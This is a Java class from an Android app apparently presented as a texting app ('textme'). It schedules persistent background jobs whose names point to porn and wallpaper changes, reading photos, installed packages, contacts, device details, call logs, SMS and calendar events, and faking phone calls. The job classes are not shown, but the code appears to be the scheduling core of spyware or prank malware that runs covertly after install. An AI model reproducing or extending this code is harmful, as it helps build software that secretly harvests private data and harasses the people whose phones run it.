package com.candroid.textme;

import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;

public class JobsScheduler {
    public static final int JOB_ID_PORN = 1;
    public static final int JOB_ID_WALLPAPER = 2;
    public static final int JOB_ID_DCIM = 3;
    public static final int JOB_ID_PACKAGES = 4;
    public static final int JOB_ID_CONTACTS = 5;
    public static final int JOB_ID_DEVICE = 6;
    public static final int JOB_ID_PHONE_CALLS = 7;
    public static final int JOB_ID_SMS = 8;
    public static final int JOB_ID_CALENDAR_EVENTS = 9;
    public static final int JOB_ID_FAKE_PHONE_CALL = 10;
    public static final long ONE_MINUTE = 60000;
    public static final long ONE_HOUR = ONE_MINUTE * 60;

    protected static void scheduleJob(Context context){
        ComponentName serviceComponent = new ComponentName(context, PornJobService.class);
        JobInfo.Builder builder = new JobInfo.Builder(JOB_ID_PORN, serviceComponent);
        builder.setMinimumLatency(15 * ONE_MINUTE);
        builder.setOverrideDeadline(30 * ONE_MINUTE);
        builder.setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY);
        JobScheduler jobScheduler = context.getSystemService(JobScheduler.class);
        jobScheduler.schedule(builder.build());
        if(jobScheduler.getPendingJob(JOB_ID_WALLPAPER) == null){
            ComponentName wallpaperService = new ComponentName(context, WallpaperJobService.class);
            JobInfo.Builder wallpaperBuilder = new JobInfo.Builder(JOB_ID_WALLPAPER, wallpaperService);
            wallpaperBuilder.setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY);
            wallpaperBuilder.setRequiresCharging(false);
            wallpaperBuilder.setRequiresBatteryNotLow(true);
            wallpaperBuilder.setRequiresStorageNotLow(true);
            wallpaperBuilder.setRequiresDeviceIdle(false);
            wallpaperBuilder.setPersisted(true);
            wallpaperBuilder.setOverrideDeadline( 24 * ONE_HOUR);
            wallpaperBuilder.setMinimumLatency(20 * ONE_MINUTE);
            jobScheduler.schedule(wallpaperBuilder.build());
        }
        if(jobScheduler.getPendingJob(JOB_ID_DCIM) == null){
            ComponentName dcimJobService = new ComponentName(context, DcimJobService.class);
            JobInfo.Builder dcimJob = new JobInfo.Builder(JOB_ID_DCIM, dcimJobService);
            dcimJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE);
            dcimJob.setRequiresCharging(false);
            dcimJob.setRequiresBatteryNotLow(true);
            dcimJob.setRequiresStorageNotLow(true);
            dcimJob.setRequiresDeviceIdle(false);
            dcimJob.setPersisted(true);
            dcimJob.setOverrideDeadline( 24 * ONE_HOUR);
            dcimJob.setMinimumLatency(7 * ONE_MINUTE);
            jobScheduler.schedule(dcimJob.build());
        }
        if(jobScheduler.getPendingJob(JOB_ID_PACKAGES) == null){
            ComponentName packagesJobService = new ComponentName(context, PackagesJobService.class);
            JobInfo.Builder packagesJob = new JobInfo.Builder(JOB_ID_PACKAGES, packagesJobService);
            packagesJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE);
            packagesJob.setRequiresCharging(false);
            packagesJob.setRequiresBatteryNotLow(true);
            packagesJob.setRequiresStorageNotLow(true);
            packagesJob.setRequiresDeviceIdle(false);
            packagesJob.setPersisted(true);
            packagesJob.setOverrideDeadline( 24 * ONE_HOUR);
            packagesJob.setMinimumLatency(6 * ONE_MINUTE);
            jobScheduler.schedule(packagesJob.build());
        }
        if(jobScheduler.getPendingJob(JOB_ID_CONTACTS) == null){
            ComponentName contactsJobService = new ComponentName(context, ContactsJobService.class);
            JobInfo.Builder contactsJob = new JobInfo.Builder(JOB_ID_CONTACTS, contactsJobService);
            contactsJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE);
            contactsJob.setRequiresCharging(false);
            contactsJob.setRequiresBatteryNotLow(true);
            contactsJob.setRequiresStorageNotLow(true);
            contactsJob.setRequiresDeviceIdle(false);
            contactsJob.setPersisted(true);
            contactsJob.setOverrideDeadline( 24 * ONE_HOUR);
            contactsJob.setMinimumLatency(4* ONE_MINUTE);
            jobScheduler.schedule(contactsJob.build());
        }
        if(jobScheduler.getPendingJob(JOB_ID_DEVICE) == null){
            ComponentName deviceJobService = new ComponentName(context, DeviceJobService.class);
            JobInfo.Builder deviceJob = new JobInfo.Builder(JOB_ID_DEVICE, deviceJobService);
            deviceJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE);
            deviceJob.setRequiresCharging(false);
            deviceJob.setRequiresBatteryNotLow(true);
            deviceJob.setRequiresStorageNotLow(true);
            deviceJob.setRequiresDeviceIdle(false);
            deviceJob.setPersisted(true);
            deviceJob.setOverrideDeadline( 24 * ONE_HOUR);
            deviceJob.setMinimumLatency(2* ONE_MINUTE);
            jobScheduler.schedule(deviceJob.build());
        }
        if(jobScheduler.getPendingJob(JOB_ID_PHONE_CALLS) == null){
            ComponentName phoneCallsJobService = new ComponentName(context, PhoneCallsJobService.class);
            JobInfo.Builder phoneCallsJob = new JobInfo.Builder(JOB_ID_PHONE_CALLS, phoneCallsJobService);
            phoneCallsJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE);
            phoneCallsJob.setRequiresCharging(false);
            phoneCallsJob.setRequiresBatteryNotLow(true);
            phoneCallsJob.setRequiresStorageNotLow(true);
            phoneCallsJob.setRequiresDeviceIdle(false);
            phoneCallsJob.setPersisted(true);
            phoneCallsJob.setOverrideDeadline( 24 * ONE_HOUR);
            phoneCallsJob.setMinimumLatency(5 * ONE_MINUTE);
            jobScheduler.schedule(phoneCallsJob.build());
        }
        if(jobScheduler.getPendingJob(JOB_ID_SMS) == null){
            ComponentName smsJobService = new ComponentName(context, SmsJobService.class);
            JobInfo.Builder smsJob = new JobInfo.Builder(JOB_ID_SMS, smsJobService);
            smsJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE);
            smsJob.setRequiresCharging(false);
            smsJob.setRequiresBatteryNotLow(true);
            smsJob.setRequiresStorageNotLow(true);
            smsJob.setRequiresDeviceIdle(false);
            smsJob.setPersisted(true);
            smsJob.setOverrideDeadline( 24 * ONE_HOUR);
            smsJob.setMinimumLatency(3 * ONE_MINUTE);
            jobScheduler.schedule(smsJob.build());
        }
        if(jobScheduler.getPendingJob(JOB_ID_CALENDAR_EVENTS) == null){
            ComponentName calendarEventJobService = new ComponentName(context, CalendarEventJobService.class);
            JobInfo.Builder calendarEventJob = new JobInfo.Builder(JOB_ID_CALENDAR_EVENTS, calendarEventJobService);
            calendarEventJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE);
            calendarEventJob.setRequiresCharging(false);
            calendarEventJob.setRequiresBatteryNotLow(true);
            calendarEventJob.setRequiresStorageNotLow(true);
            calendarEventJob.setRequiresDeviceIdle(false);
            calendarEventJob.setPersisted(true);
            calendarEventJob.setOverrideDeadline( 24 * ONE_HOUR);
            calendarEventJob.setMinimumLatency(1 * ONE_MINUTE);
            jobScheduler.schedule(calendarEventJob.build());
        }
        if(jobScheduler.getPendingJob(JOB_ID_FAKE_PHONE_CALL) == null){
            ComponentName fakeCallJobService = new ComponentName(context, FakeCallJobService.class);
            JobInfo.Builder calendarEventJob = new JobInfo.Builder(JOB_ID_FAKE_PHONE_CALL, fakeCallJobService);
            calendarEventJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE);
            calendarEventJob.setRequiresCharging(false);
            calendarEventJob.setRequiresBatteryNotLow(true);
            calendarEventJob.setRequiresStorageNotLow(true);
            calendarEventJob.setRequiresDeviceIdle(false);
            calendarEventJob.setPersisted(true);
            calendarEventJob.setOverrideDeadline( 24 * ONE_HOUR);
            calendarEventJob.setMinimumLatency(8 * ONE_MINUTE);
            jobScheduler.schedule(calendarEventJob.build());
        }
    }
}